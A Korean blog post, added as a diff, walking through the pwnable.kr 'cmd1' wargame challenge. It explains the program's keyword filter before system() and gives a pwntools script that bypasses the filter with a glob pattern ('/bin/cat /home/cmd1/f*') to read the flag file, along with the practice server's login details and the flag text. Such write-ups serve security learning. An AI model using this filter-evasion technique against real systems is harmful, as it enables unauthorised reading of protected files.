@@ -1,0 +1,68 @@
+---
+layout: post
+title:  "14. cmd1"
+subtitle: ""
+date:   2018-11-11 12:55:13 +0900
+categories: security
+tags : pwnable
+---
+
+
+![1]({{"/assets/img/security/pwnable/14/1.png" | absolute_url}})
+
+`PATH` 환경변수 관련 문제인 것 같다.
+
+코드를 보자.
+
+<br>
+
+![2]({{"/assets/img/security/pwnable/14/2.png" | absolute_url}})
+
+짧다.
+
+시작하자마자 `PATH` 환경변수를 덮는다.
+
+그리고 `argv[1]`을 filter 함수로 filter 후에 `flag`, `sh`, `tmp`가 없으면
+
+`system` 함수로 실행한다.
+
+<br>
+
+{% highlight bash %}
+./cmd1 "/bin/cat /home/cmd1/flag"
+{% endhighlight %}
+
+<br>
+
+대충 이런 문장을 실행시켜서 플래그를 읽어야 할 것 같은데..
+
+여긴 `flag`라는 문자열이 들어가기 때문에 실행할 수 없다.
+
+그럼..
+
+![3]({{"/assets/img/security/pwnable/14/3.png" | absolute_url}})
+
+<br>
+
+{% highlight bash %}
+mommy now I get what PATH environment is for :)
+{% endhighlight %}
+
+
+---
+### pwntools
+
+{% highlight python %}
+from pwn import *
+ 
+id   = 'cmd1'
+host = 'pwnable.kr'
+port = 2222
+pw   = 'guest'
+s = ssh(id, host, port=port, password=pw)
+ 
+argv = '\"/bin/cat /home/cmd1/f*\"'
+res = s.run('./cmd1 ' + argv)
+res.interactive()
+{% endhighlight %}
+
